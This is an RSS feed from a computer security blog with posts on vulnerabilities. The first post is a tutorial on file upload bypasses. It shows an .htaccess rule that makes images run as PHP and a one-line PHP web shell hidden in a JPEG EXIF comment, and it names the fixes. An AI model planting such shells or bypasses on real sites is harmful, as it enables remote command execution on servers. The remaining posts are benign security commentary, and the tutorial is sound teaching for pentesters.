<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>Vulnerability &#8211; Phocean.net</title>
	<atom:link href="/blog-archive/tag/vulnerability/feed" rel="self" type="application/rss+xml" />
	<link>/blog-archive</link>
	<description>Computer Security Blog</description>
	<lastBuildDate>Fri, 24 Feb 2017 21:17:51 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>hourly</sy:updatePeriod>
	<sy:updateFrequency>1</sy:updateFrequency>
	<generator>https://wordpress.org/?v=4.9.10</generator>
	<item>
		<title>File upload vulnerabilities : appending PHP code to an image</title>
		<link>/blog-archive/2013/09/29/file-upload-vulnerabilities-appending-php-code-to-an-image.html</link>
		<comments>/blog-archive/2013/09/29/file-upload-vulnerabilities-appending-php-code-to-an-image.html#comments</comments>
		<pubDate>Sun, 29 Sep 2013 21:03:05 +0000</pubDate>
		<dc:creator><![CDATA[phocean]]></dc:creator>
				<category><![CDATA[Pentesting]]></category>
		<category><![CDATA[Security]]></category>
		<category><![CDATA[file upload]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[PHP]]></category>
		<category><![CDATA[Vulnerability]]></category>
		<category><![CDATA[web]]></category>

		<guid isPermaLink="false">http://www.phocean.net/?p=1666</guid>
		<description><![CDATA[Several ways may be used to protect a file upload functionality on a website. A first method is content-type checking, which can be easily bypassed with a intercepting proxy (tampering the MIME type). The screenshot below shows an intercepted request where the attacker modifies the content-type (beforehand text/php) and then forwards the content to the...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2013/09/29/file-upload-vulnerabilities-appending-php-code-to-an-image.html">Continue Reading</a></span>]]></description>
				<content:encoded><![CDATA[<p>Several ways may be used to protect a file upload functionality on a website.</p>
<p>A first method is <strong>content-type </strong>checking, which can be easily bypassed with a intercepting proxy (tampering the MIME type). The screenshot below shows an intercepted request where the attacker modifies the content-type (beforehand <code>text/php</code>) and then forwards the content to the server:</p>
<div id="attachment_1667" style="width: 590px" class="wp-caption aligncenter"><img class="size-medium wp-image-1667" alt="HTTP POST content-type tampering" src="/blog-archive/wp-content/uploads/2013/09/CapturFiles_13-580x313.png" width="580" height="313" srcset="/blog-archive/wp-content/uploads/2013/09/CapturFiles_13-580x313.png 580w, /blog-archive/wp-content/uploads/2013/09/CapturFiles_13-624x337.png 624w, /blog-archive/wp-content/uploads/2013/09/CapturFiles_13.png 902w" sizes="(max-width: 580px) 100vw, 580px" /><p class="wp-caption-text">HTTP POST content-type tampering</p></div>
<p>Thus, the content-type filtering is bypassed.</p>
<p>Another method consists in checking the file name <strong>extension</strong>. If simple bypasses like playing with lowercase (<code>.PHP</code> instead of <code>.php</code>), using multiple extension (<code>.php.foo</code>) or triggering the NULL byte (<code>.php%00.jpg</code>) do not work, there is a last chance by uploading a crafted image.</p>
<p>JPEG files are convenient for code injection: they support EXIF metadata, which include a <em>comment</em> field where anything can be written, as long as it is on a single line.</p>
<p>So, when a web server parses the image content, it may interpret the PHP code inside if it is improperly secured.</p>
<p>The method is however totally dependent on the ability to upload a <code>.htaccess</code> file, which may be a long way to go.</p>
<p>Though, one advantage of using an image in most upload vulnerability exploitation cases is stealth: an image will always look less suspicious than a dropped <code>.php</code> file.</p>
<p>Anyway, for fun, here is how to do:</p>
<ol class="split start">
<li>Upload a <code>.htaccess</code> file that contains:
<pre>AddType application/x-httpd-php .jpg</pre>
</li>
<li>Take a JPEG file of your choice, install the <a title="Jhead" href="http://www.sentex.net/~mwandel/jhead/">jhead</a> tool (there are many alternatives, like <a title="exiftool" href="http://www.sno.phy.queensu.ca/~phil/exiftool/">exiftool</a>, but this one is straightforward).</li>
<li>House-keeping (delete extra headers):
<pre>jhead -purejpg &lt;filename&gt;.jpg</pre>
</li>
<li>Edit EXIF JPEG comment:
<pre>jhead -ce &lt;filename&gt;.jpg</pre>
</li>
<li>Copy / paste your PHP code, like this one for instance (must fit in one line):
<pre>&lt;style&gt;body{font-size: 0;}h1{font-size: 12px}&lt;/style&gt;&lt;h1&gt;&lt;?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}else{echo '&lt;img src="./clean_imagejs';}__halt_compiler();?&gt;&lt;/h1&gt;</pre>
<p>This code just reads a command from the cmd parameter when it is set. If it is absent, then for more discretion it displays another image (clean_image.jpg, that you would have uploaded previously, for instance). The CSS style trick (font size of 0) just hides some garbage that comes from the JPEG header.</li>
<li>Just upload the file and test it! <a title="DVWA" href="http://www.dvwa.co.uk">DVWA</a> is a convenient and safe way for that.</li>
</ol>
<p>Note this <a title="php image upload security how not to do it" href="http://nullcandy.com/php-image-upload-security-how-not-to-do-it/">nice article</a> as a reference on the topic, and the solution that is suggested to fix such a vulnerability: disabling one way or another script execution on the upload directory and use random server-side file renaming.</p>
]]></content:encoded>
			<wfw:commentRss>/blog-archive/2013/09/29/file-upload-vulnerabilities-appending-php-code-to-an-image.html/feed</wfw:commentRss>
		<slash:comments>6</slash:comments>
		</item>
		<item>
		<title>Vulnerabilities in software from Schneider Electric</title>
		<link>/blog-archive/2011/06/23/vulnerabilities-in-software-from-schneider-electric.html</link>
		<pubDate>Thu, 23 Jun 2011 18:25:19 +0000</pubDate>
		<dc:creator><![CDATA[phocean]]></dc:creator>
				<category><![CDATA[Security]]></category>
		<category><![CDATA[Vulnerabilities]]></category>
		<category><![CDATA[disclosure]]></category>
		<category><![CDATA[schneider]]></category>
		<category><![CDATA[Vulnerability]]></category>

		<guid isPermaLink="false">http://www.phocean.net/?p=1093</guid>
		<description><![CDATA[I found multiple vulnerabilities in software from Schneider Electric, used to monitor industrial monitoring devices. It reveals a very poor security design. The editor was informed and I am waiting for its acknowledgement. I will disclose more details once the issues are patched.]]></description>
				<content:encoded><![CDATA[<p>I found multiple vulnerabilities in software from Schneider Electric, used to monitor industrial monitoring devices. It reveals a very poor security design.</p>
<p>The editor was informed and I am waiting for its acknowledgement. I will disclose more details once the issues are patched.</p>
]]></content:encoded>
			</item>
		<item>
		<title>SecurityFocus changing</title>
		<link>/blog-archive/2010/03/12/securityfocus-changing.html</link>
		<pubDate>Fri, 12 Mar 2010 21:19:28 +0000</pubDate>
		<dc:creator><![CDATA[phocean]]></dc:creator>
				<category><![CDATA[Security]]></category>
		<category><![CDATA[Vulnerability]]></category>

		<guid isPermaLink="false">http://www.phocean.net/?p=749</guid>
		<description><![CDATA[A big change on Security Focus is going to happen. Except the vulnerability database, most of its content and resources are going to move to Symantec. RIP.]]></description>
				<content:encoded><![CDATA[<p>A<a title="SecurityFocus changing" href="http://www.securityfocus.com/news/11582" target="_blank"> big change</a> on Security Focus is going to happen. Except the vulnerability database, most of its content and resources are going to move to Symantec. RIP.</p>
]]></content:encoded>
			</item>
		<item>
		<title>Nessus 4.2</title>
		<link>/blog-archive/2009/12/01/nessus-4-2.html</link>
		<pubDate>Tue, 01 Dec 2009 20:21:23 +0000</pubDate>
		<dc:creator><![CDATA[phocean]]></dc:creator>
				<category><![CDATA[Defense]]></category>
		<category><![CDATA[Pentesting]]></category>
		<category><![CDATA[Security]]></category>
		<category><![CDATA[nessus]]></category>
		<category><![CDATA[scanner]]></category>
		<category><![CDATA[Vulnerability]]></category>

		<guid isPermaLink="false">http://www.phocean.net/?p=534</guid>
		<description><![CDATA[Nessus 4.2 is out. I tried it out and I must say that the new UI is great. I am not a big fan of Flash and I regret this choice. However, the design is excellent, all options are accessible in a logical way. Instead of spreading over the options like it used to be,...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2009/12/01/nessus-4-2.html">Continue Reading</a></span>]]></description>
				<content:encoded><![CDATA[<p><a title="Nessus 4.2" href="http://www.nessus.org/download/" target="_blank">Nessus 4.2</a> is out.</p>
<p>I tried it out and I must say that the new UI is great. I am not a big fan of Flash and I regret this choice. However, the design is excellent, all options are accessible in a logical way. Instead of spreading over the options like it used to be, they come to you in the right order.</p>
<p>I also appreciate that the server and the client set-up are now unified thanks to the web interface (you can access it from localhost or from the network indifferently).</p>
<p>The report section has also been greatly improved.</p>
<p>So, if you were already an Nessus user, it is worth upgrading.</p>
<p>Talking about the set-up, there is an up-to-date package for openSUSE (of course, there are a lot less dependencies than before).</p>
]]></content:encoded>
			</item>
		<item>
		<title>OpenSSL : CVE-2009-3555 security fix and mod_ssl client authentication breakage</title>
		<link>/blog-archive/2009/11/28/openssl-cve-2009-3555-security-fix-and-mod_ssl-client-authentication-breakage.html</link>
		<comments>/blog-archive/2009/11/28/openssl-cve-2009-3555-security-fix-and-mod_ssl-client-authentication-breakage.html#comments</comments>
		<pubDate>Sat, 28 Nov 2009 16:08:50 +0000</pubDate>
		<dc:creator><![CDATA[phocean]]></dc:creator>
				<category><![CDATA[Cryptography]]></category>
		<category><![CDATA[Linux]]></category>
		<category><![CDATA[Security]]></category>
		<category><![CDATA[System]]></category>
		<category><![CDATA[Apache]]></category>
		<category><![CDATA[Debian]]></category>
		<category><![CDATA[openSUSE]]></category>
		<category><![CDATA[SSL]]></category>
		<category><![CDATA[Vulnerability]]></category>

		<guid isPermaLink="false">http://www.phocean.net/?p=524</guid>
		<description><![CDATA[A security advisory on OpenSSL has recently been published. Details are there and there. It is vulnerable to a MiTM attack where the attacker can intercept and retrieve the credential to a trusted HTTPS website, by intercepting the session cookie sent back to the client. A proof of concept of an attack against Twitter was...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2009/11/28/openssl-cve-2009-3555-security-fix-and-mod_ssl-client-authentication-breakage.html">Continue Reading</a></span>]]></description>
				<content:encoded><![CDATA[<p>A security advisory on OpenSSL has recently been published. Details are <a title="CVE-2009-3555" href="http://secunia.com/advisories/cve_reference/CVE-2009-3555/">there</a> and <a title="renegociation vulnerability" href="http://www.securegoose.org/2009/11/tls-renegotiation-vulnerability-cve.html">there</a>.</p>
<p>It is vulnerable to a <strong>MiTM attack </strong>where the attacker can intercept and retrieve the credential to a trusted HTTPS website, by intercepting the session cookie sent back to the client.</p>
<p>A proof of concept of an attack against Twitter was made.</p>
<p>Fine. But so far, <strong>the answer was to just disable any renegociation</strong>.</p>
<p>This actually causes some issues with SSL session timeout and totally broke client authentication.</p>
<p>I got into problems because of the latter. I am using client authentication for some location of my web server, and I recently could not connect anymore to these with the following log in apache :</p>
<pre>[Tue Nov 24 16:56:15 2009] [debug] ssl_engine_kernel.c(1912): OpenSSL:Exit: error in SSLv3 read client hello A
[Tue Nov 24 16:56:15 2009] [error] [client x.x.x.x] Re-negotiation handshake failed: Not accepted by client!?</pre>
<p>I first was not aware of the openssl patch and tried almost anything possible. My focus was, of course, on the certificate and the client.<br />
But, a nice guy on IRC #suse,<strong> Stittel</strong>, had a good hunch and suggested me to look at the CVE-2009-3555 fix.</p>
<p>After more tests, it was quickly confirmed to work well with older versions of OpenSSL (as shipped in Debian Lenny).<br />
Finally, I downgraded the OpenSSL version on my openSUSE box to a version prior to the CVE-2009-3555 fix and it just worked fine.</p>
<p>Then, I dig into it and found a lot of interesting reports <a href="https://bugzilla.redhat.com/show_bug.cgi?id=533125" target="_blank">there</a> and <a href="http://old.nabble.com/TLS-renegotiation-disabling-:-mod_ssl-and-OpenSSL--0.9.8l-td26285568.html" target="_blank">there</a>. So far it is a real mess.<br />
In short, the breakage will stay as long as browsers don&#8217;t also include a patch to avoid renegotiation.<br />
So far, I could not find a browser that does include a patch.<br />
If anyone reading it knows a version that does it, please let me know.</p>
<p>Meanwhile, you have actually the choice between :</p>
<ul>
<li>low security by deactivating client authentication on your server</li>
<li>low security by keeping a vulnerable version of OpenSSL</li>
</ul>
<p>As my server is not very exposed, I chose the latter, but that&#8217;s not satisfying.  It is not recommended, but if like me you need to use client authentication with mod_ssl on openSUSE 11.2, do :</p>
<pre>% zypper install --from repo-oss openssl openssl-certs libopenssl0_9_8 libopenssl0_9_8-32bit</pre>
<p>where repo-oss is the alias to the 11.2 release (without updates) on your system.</p>
<p>What a brutal way to fix an issues without much notification and consideration to the users ! Even the log message is wrong and just confusing the administrator&#8230;</p>
<p><em>PS 1 : thanks again to Stittel for the good hint (I hope you will come by here) and to the always nice and helpful #suse channel in general ;)</em></p>
<p><em>PS 2 : <a href="https://bugzilla.novell.com/show_bug.cgi?id=558176" target="_blank">bug reported</a> on openSUSE bugzilla</em></p>
]]></content:encoded>
			<wfw:commentRss>/blog-archive/2009/11/28/openssl-cve-2009-3555-security-fix-and-mod_ssl-client-authentication-breakage.html/feed</wfw:commentRss>
		<slash:comments>2</slash:comments>
		</item>
		<item>
		<title>openSUSE kernel sources : patching against sock_sendpage() NULL Pointer Dereference vulnerability</title>
		<link>/blog-archive/2009/08/17/opensuse-kernel-sources-patching-against-sock_sendpage-null-pointer-dereference-vulnerability.html</link>
		<comments>/blog-archive/2009/08/17/opensuse-kernel-sources-patching-against-sock_sendpage-null-pointer-dereference-vulnerability.html#comments</comments>
		<pubDate>Mon, 17 Aug 2009 12:47:34 +0000</pubDate>
		<dc:creator><![CDATA[phocean]]></dc:creator>
				<category><![CDATA[Defense]]></category>
		<category><![CDATA[Linux]]></category>
		<category><![CDATA[Security]]></category>
		<category><![CDATA[System]]></category>
		<category><![CDATA[openSUSE]]></category>
		<category><![CDATA[patch]]></category>
		<category><![CDATA[socket]]></category>
		<category><![CDATA[Vulnerability]]></category>

		<guid isPermaLink="false">http://www.phocean.net/?p=405</guid>
		<description><![CDATA[I am using the 2.6.30 kernel sources from Kernel:linux-next and noticed that it has not yet been patched against the ’sock_sendpage()’ NULL Pointer Dereference vulnerability. The threat is serious as it could allow a local user to gain root privileges. Those who compile their own 2.6.x kernel should apply this patch (from Linus, check there...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2009/08/17/opensuse-kernel-sources-patching-against-sock_sendpage-null-pointer-dereference-vulnerability.html">Continue Reading</a></span>]]></description>
				<content:encoded><![CDATA[<p>I am using the 2.6.30 kernel sources from Kernel:linux-next and noticed that it has not yet been patched against the <a title="Null pointer deference" href="http://www.securitytracker.com/alerts/2009/Aug/1022732.html" target="_blank"><strong>’sock_sendpage()’ NULL Pointer Dereference</strong></a> vulnerability.</p>
<p>The threat is serious as it could allow a local user to gain root privileges.</p>
<p>Those who compile their own <strong>2.6.x kernel</strong> should apply <a href="/blog-archive/wp-content/uploads/2009/08/sock_sendpage.patch">this patch</a> (from Linus, check <a href="http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=e694958388c50148389b0e9b9e9e8945cf0f1b98">there</a> for more info) .</p>
<p>Within your kernel source folder :</p>
<pre>$ patch -u -p0 &lt; sock_sendpage.patch</pre>
<p>I hope an official patch will be released soon for all kernels. I did not check if the 11.1 kernel has already been patched or not.</p>
]]></content:encoded>
			<wfw:commentRss>/blog-archive/2009/08/17/opensuse-kernel-sources-patching-against-sock_sendpage-null-pointer-dereference-vulnerability.html/feed</wfw:commentRss>
		<slash:comments>2</slash:comments>
		</item>
		<item>
		<title>About network attacks&#8230;</title>
		<link>/blog-archive/2008/06/23/about-network-attacks.html</link>
		<pubDate>Sun, 22 Jun 2008 23:56:08 +0000</pubDate>
		<dc:creator><![CDATA[phocean]]></dc:creator>
				<category><![CDATA[Network]]></category>
		<category><![CDATA[Pentesting]]></category>
		<category><![CDATA[Security]]></category>
		<category><![CDATA[Hacking]]></category>
		<category><![CDATA[Network attack]]></category>
		<category><![CDATA[OSI]]></category>
		<category><![CDATA[RFC]]></category>
		<category><![CDATA[TCP/IP]]></category>
		<category><![CDATA[Vulnerability]]></category>

		<guid isPermaLink="false">http://www.phocean.net/?p=111</guid>
		<description><![CDATA[I will post later a few examples of network attacks. But, before that, I want to clarify what I call a network attack. I see many people making a confusion about the use of this term, even among professional or specialized journalists. Whenever there is a hack originated from the Internet, they call it a...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2008/06/23/about-network-attacks.html">Continue Reading</a></span>]]></description>
				<content:encoded><![CDATA[<p>I will post later a few examples of network attacks. But, before that, I want to clarify what I call a network attack.</p>
<p>I see many people making a confusion about the use of this term, even among professional or specialized journalists. Whenever there is a hack originated from the Internet, they call it a network attack.</p>
<p>This is a true misunderstanding of the reality. We will see why when a website is hacked, or a domain name spoofed, we can&#8217;t call it a network attack.</p>
<p>First of all, we need to have a good picture of the way the protocols of the Internet are organized.</p>
<p>We can visualize it with the <strong>OSI </strong>concept, whose scheme is below :</p>
<p style="text-align: center;"><a href="/blog-archive/wp-content/uploads/2008/06/osi.png" rel="lightbox[111]"><img class="size-medium wp-image-112" style="vertical-align: middle;" title="osi" src="/blog-archive/wp-content/uploads/2008/06/osi-300x270.png" alt="" width="300" height="270" srcset="/blog-archive/wp-content/uploads/2008/06/osi-300x270.png 300w, /blog-archive/wp-content/uploads/2008/06/osi.png 434w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
<p>This model offers <strong>7 layers</strong> to contain all protocols involved in the data transportation, from the system or the program of a local computer to its peer on the other side of the network.</p>
<p><span id="more-111"></span></p>
<p>Actually, and to the contrary of another common belief, this model was never really applied on the Internet. Instead, a simplified model of 4 layers was chosen, <a href="http://en.wikipedia.org/wiki/Tcp/ip_model">the TCP/IP model</a>.</p>
<p>Anyway, acconding to this model, each data is encapsulated by the protocols of each layer from the top to the bottom before traveling on the network.</p>
<p>Normally, equipments between the sender and the recipient will not check the data upper than the transport layer. It means that to connect two peers through the Internet, protocols like <em>Ethernet, ARP, RIP, OSPF, IP, TCP</em> and <em>UDP</em> are used.</p>
<p>Protocols like <em>HTTP, DNS, FTP </em>and so many others belong  to the Application layer. Therefore, they are used to serve application, not to connect two peers from the network point of view.</p>
<p>Therefore, when a web server is attacked from the Internet, it is not a network attack. It is an application level attack : the network is just a vector, but the vulnerability is at the application level. It may concern the architecture or the conception of the application, but not the network.</p>
<p>So many popular attacks like brute force attacks to guess a password, exploits, shellcodes, DNS spoofing, PHP misconceptions, etc., are off the network attack categories.</p>
<p>Nowadays, as there are more and more services offered on the Internet, application attacks became the most popular and most efficient for attackers. However, if network attacks have been spectacular <a href="http://en.wikipedia.org/wiki/Mitnick" target="_blank">in the 90s and entered the history</a>, they are still efficient.</p>
<p>Among network attacks, we can differentiate two main categories : <em>protocol vulnerabilities</em> and <em>implementation weaknesses</em>. Of course, it is not that simple and some attacks are a combination of these categories.</p>
<h4 class="western">Protocol weaknesses</h4>
<p>Most of the protocols we use today were conceived in the 80s, or even before. At the name, the engineers never predicted such a growth of the Internet. They did not put much thinking on problems like scalability or security : their needs were very simple and basics, and Internet was very confidential, mostly connecting a few universities in the world.</p>
<p>The growth of the Internet have been so fast, that the protocols could not be adapted at the right pace to the new needs. Now, we inherit of conceptual security leaks at all OSI layers and there is nothing much being done against that.</p>
<h4 class="western">Implementation weaknesses</h4>
<p><a href="http://www.rfc-editor.org/" target="_blank">The RFC</a> put the bases to implement the protocol in the hardware or in the systems. It implies programming and therefore a classical development cycle : putting down the needs, interpreting the specifications, making arbitrary choices and finally coding. Of course, at any of these stages, there is a potential risk of human mistake, misconception, bug, buffer overflow, unexpected behaviour, etc. Some can be very critical for the whole security of the hardware or the system.</p>
<p>In that case, it is just like an application level vulnerability, but on the IP stack or the drivers handling the network packets. That leads to a network attack.</p>
<p>There is <a href="http://www.securityfocus.com/" target="_blank">a huge number of vulnerabilities</a>. All operating systems are concerned, as well as all hardware equipments (switches, routers, firewalls, etc.).</p>
<p>That&#8217;s it about this short introduction to network attacks. It does not aim to be complete, but just to put the basics of my next articles.</p>
<p>In the coming articles, we will see a few example of network attacks. In the next one, we will start from the bottom of the OSI model : <strong>physical layer attacks</strong>.</p>
]]></content:encoded>
			</item>
		<item>
		<title>The SSL/SSH disaster</title>
		<link>/blog-archive/2008/05/15/the-sslssh-disaster.html</link>
		<comments>/blog-archive/2008/05/15/the-sslssh-disaster.html#comments</comments>
		<pubDate>Thu, 15 May 2008 16:23:22 +0000</pubDate>
		<dc:creator><![CDATA[phocean]]></dc:creator>
				<category><![CDATA[Security]]></category>
		<category><![CDATA[Debian]]></category>
		<category><![CDATA[Linux]]></category>
		<category><![CDATA[OpenVPN]]></category>
		<category><![CDATA[SSH]]></category>
		<category><![CDATA[SSL]]></category>
		<category><![CDATA[Vulnerability]]></category>

		<guid isPermaLink="false">http://www.phocean.net/?p=106</guid>
		<description><![CDATA[Due to the recent security hole discovered in Debian, which has also concerned various distributions &#8211; of course including Ubuntu &#8211; for 2 years, I simply closed all my SSH and OpenVPN accesses. I have had no time so far to check all the keys on my server. I prefer to stay on the safe...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2008/05/15/the-sslssh-disaster.html">Continue Reading</a></span>]]></description>
				<content:encoded><![CDATA[<p>Due to the recent security hole discovered in Debian, which has also concerned various distributions &#8211; of course including Ubuntu &#8211; for 2 years, I simply closed all my SSH and OpenVPN accesses.</p>
<p>I have had no time so far to check all the keys on my server. I prefer to stay on the safe side, though I have some reason to believe that my keys might not be so vulnerable : I generated them a long time ago, maybe before the Debian maintainer sad mistake.</p>
<p>It is going to be pretty easy now, for those who are motivated, to get access to the ssh server running keys generated during the 2 last years&#8230;</p>
<p>I recommend <a title="ssl and ssh weakness" href="http://blog.drinsama.de/erich/en/linux/2008051401-consequences-of-sslssh-weakness.html" target="_blank">this article</a> which summarize pretty well the situation. You may also use <a title="downkd.pl" href="http://security.debian.org/project/extra/dowkd/dowkd.pl.gz">this tool</a>, which checks if your keys are vulnerable :</p>
<pre>$  perl dowkd.pl file ~/.ssh/*.pub</pre>
<p>It find it funny to think that I chose to use certificates for security (avoiding brute force attacks).<br />
What&#8217;s less funny is the pure disaster for the reputation of Debian.</p>
<p>I already noticed in the past that some companies switched their servers from Debian to Red Hat because of such security problems. They claimed about some security holes being patch much too slowly and about the lack of official support to rely on in such a crisis.<br />
This kind of news is not going to enforce trust from companies.</p>
<p>I myself will think twice in the future about what system to use when I design my networks.</p>
]]></content:encoded>
			<wfw:commentRss>/blog-archive/2008/05/15/the-sslssh-disaster.html/feed</wfw:commentRss>
		<slash:comments>1</slash:comments>
		</item>
		<item>
		<title>Cold boot attack, not a threat to Full disk encryption (FDE)</title>
		<link>/blog-archive/2008/02/26/cold-boot-attack-not-a-threat-to-full-disk-encryption-fde.html</link>
		<comments>/blog-archive/2008/02/26/cold-boot-attack-not-a-threat-to-full-disk-encryption-fde.html#comments</comments>
		<pubDate>Tue, 26 Feb 2008 09:53:02 +0000</pubDate>
		<dc:creator><![CDATA[phocean]]></dc:creator>
				<category><![CDATA[Cryptography]]></category>
		<category><![CDATA[Hardware]]></category>
		<category><![CDATA[Linux]]></category>
		<category><![CDATA[Security]]></category>
		<category><![CDATA[Cold boot attack]]></category>
		<category><![CDATA[Encryption]]></category>
		<category><![CDATA[FDE]]></category>
		<category><![CDATA[Hard drive]]></category>
		<category><![CDATA[TPM]]></category>
		<category><![CDATA[Vulnerability]]></category>

		<guid isPermaLink="false">http://www.phocean.net/?p=100</guid>
		<description><![CDATA[Since the new cold boot attack hack is on the news, touching most of the software encryption solutions, I have wondered if it had any chance to concern also hardware encryption. Hardware encryption is provided by a few laptop makers, generally on high-range an business models. It has much less performance impact than software encryption,...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2008/02/26/cold-boot-attack-not-a-threat-to-full-disk-encryption-fde.html">Continue Reading</a></span>]]></description>
				<content:encoded><![CDATA[<p>Since the new cold boot attack hack is on the news, touching most of the software encryption solutions, I have wondered if it had any chance to concern also hardware encryption.</p>
<p>Hardware encryption is provided by a few laptop makers, generally on high-range an business models.</p>
<p>It has much less performance impact than software encryption, and protect the data independently from your system configuration and its partitions.</p>
<p>Full disk encryption is the so called hardware encryption technology used by Lenovo on my Thinkpad.</p>
<p><span id="more-100"></span></p>
<p>Mine comes with a Hitachi hard drive. Hitachi names its encryption technology <strong><em>&#8220;Bulk Data Encryption&#8221;</em></strong>.</p>
<p>I know at least Seagate provides the same kind of feature.</p>
<p>The bulk data encryption is based on the<strong> AES algorithm with a 128 bits key</strong>.</p>
<p>Actually, the encryption is not done by the laptop itself but by the hard-drive.</p>
<p>You need both the hard drive and the laptop supporting encryption , for the following reasons :</p>
<ol>
<li>your motherboard must have a TPM chip, which is used for the encryption, as a unique source to derivate the encryption keys.</li>
<li>the BIOS must interface with the hard drive FDE, to set/unset the encryption and to prompt for the password before the real boot (actually, a small OS embedded on the drive take care of this authentication).</li>
</ol>
<p>In reality, the encryption is always active and the password to access to the drive is just another security feature. There is no link between these two functions. That&#8217;s why the fact of setting a password is immediate : no reencryption is done because the password has nothing to do with encryption.</p>
<p>In case of authentication success, the system boots normally.</p>
<p>In case of failure, and if the maximum number of attempt is reached, the data is erased. Instead of initializing the content with 0, which would take a lot of time and could be interrupted by shutting down the machine, just the keys are destroyed within a few seconds.</p>
<p>Anyway, the content is supposed to be very hard to retrieve thanks to the effectiveness of the AES algorithm.</p>
<p>One important thing is that <strong>the key is not a derivate of the password you set</strong>.</p>
<p>The hard drive password is a feature that does not come necessarily with encryption.</p>
<p>It is just there to limit the access of the content, but not its confidentiality.</p>
<p>For instance, you could imagine that if the drive is stolen, someone opens physically the drive, change the ROM to pass over the password and read your data without any pain.</p>
<p>The con of that is <strong>the encryption keys generation is based on your hardware</strong>. A different hardware can&#8217;t decipher the drive.</p>
<p>If your motherboard breaks down, you won&#8217;t be able to read your data from another computer ! Make some good backups&#8230;</p>
<p>To go back to the main topic, <strong>is the cold boot attack a threat for this hardware encryption ?</strong></p>
<p>No. The encryption algorithm is not in the user land, so no key is stored in RAM.</p>
<p><strong> The key hashes are stored directly on the disk.</strong></p>
<p>These documents from Hitachi provide more detailed information :</p>
<p><a title="Bulk encryption white paper" href="/blog-archive/wp-content/uploads/2008/02/bulk_encryption_white_paper.pdf">Bulk encryption white paper</a></p>
<p><a title="HowTo guide for bulk data encryption" href="/blog-archive/wp-content/uploads/2008/02/howtoguide_bulkdataencryption_final.pdf">HowTo guide for bulk data encryption</a></p>
<p><a title="Hardware encryption" href="http://en.wikipedia.org/wiki/Full_disk_encryption">This Wikipedia article</a>, underlining the main points of hardware encryption,  is also interesting.</p>
<p>I guess that at some point it would be possible to read some hash on the hard drive electronic board, but this is not going to be easy. You need to be a hardware expert in hard drives and for sure it can&#8217;t be done as quickly as with the RAM chip.</p>
<p>Of course, even the cold boot attack is extreme. Most of thief won&#8217;t care about your data, or won&#8217;t be the knowledge or the practical possibility to conduct a successful attack.</p>
<p>If you don&#8217;t have FDE support, you should continue to use an encryption solution like dm-crypt or Truecrypt and maybe consider turning off your computer more often.</p>
<p>It anyway remains an excellent solution for external disks, as it is normally not all the time attached to your computer.</p>
<p>Personally, as FDE offers more performance and transparency, I am using it on my laptop but I keep using dm-crypt on all my external drives.</p>
<p>Now the question is : what good workaround can be found to provide more secure software encryption ?</p>
]]></content:encoded>
			<wfw:commentRss>/blog-archive/2008/02/26/cold-boot-attack-not-a-threat-to-full-disk-encryption-fde.html/feed</wfw:commentRss>
		<slash:comments>2</slash:comments>
		</item>
		<item>
		<title>md5 hash googling &#8211; and WordPress password weakness</title>
		<link>/blog-archive/2007/11/26/md5-hash-googling-and-wordpress-password-weakness.html</link>
		<comments>/blog-archive/2007/11/26/md5-hash-googling-and-wordpress-password-weakness.html#comments</comments>
		<pubDate>Mon, 26 Nov 2007 07:38:16 +0000</pubDate>
		<dc:creator><![CDATA[phocean]]></dc:creator>
				<category><![CDATA[Cryptography]]></category>
		<category><![CDATA[Security]]></category>
		<category><![CDATA[hash]]></category>
		<category><![CDATA[MD5]]></category>
		<category><![CDATA[Vulnerability]]></category>
		<category><![CDATA[Wordpress]]></category>

		<guid isPermaLink="false">http://www.phocean.net/?p=86</guid>
		<description><![CDATA[Some Md5 password implementation &#8211; without a salt, become more insecure than ever. There is an issue right now with WordPress, I hope they will fix it soon ! Check this interesting article. No need to take out your rainbow tables anymore, just google your hash ! I hope your password is strong enough&#8230; You...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2007/11/26/md5-hash-googling-and-wordpress-password-weakness.html">Continue Reading</a></span>]]></description>
				<content:encoded><![CDATA[<p>Some Md5 password implementation &#8211; without a salt, become more insecure than ever. There is an issue right now with WordPress, I hope they will fix it soon !</p>
<p><a title="Lightbluetouchpaper - md5" href="http://www.lightbluetouchpaper.org/" target="_blank">Check this interesting article</a>.</p>
<p>No need to take out your rainbow tables anymore, just google your hash ! I hope your password is strong enough&#8230;</p>
<p>You could also use one of these :</p>
<p><a title="md5 rednoize" href="http://md5.rednoize.com/" target="_blank">http://md5.rednoize.com</a></p>
<p><a title="md5 cryptobitch" href="http://md5.cryptobitch.de" target="_blank">http://md5.cryptobitch.de </a></p>
]]></content:encoded>
			<wfw:commentRss>/blog-archive/2007/11/26/md5-hash-googling-and-wordpress-password-weakness.html/feed</wfw:commentRss>
		<slash:comments>1</slash:comments>
		</item>
	</channel>
</rss>
